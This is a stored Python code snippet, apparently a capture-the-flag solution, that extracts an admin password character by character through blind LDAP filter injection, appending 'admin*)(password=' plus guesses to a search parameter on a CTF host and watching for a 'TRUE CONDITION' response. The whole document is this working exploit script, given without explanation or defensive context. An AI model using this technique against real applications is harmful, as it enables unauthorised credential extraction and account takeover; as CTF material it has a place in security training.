---
id: 6004cf3a-6b68-4703-805f-71fe1beb0b51
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:01.731221+00:00'
updated_at: '2023-04-10T20:36:29.433607+00:00'
---

# Code Snippet 6004cf3a

**Language**: Python

```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```


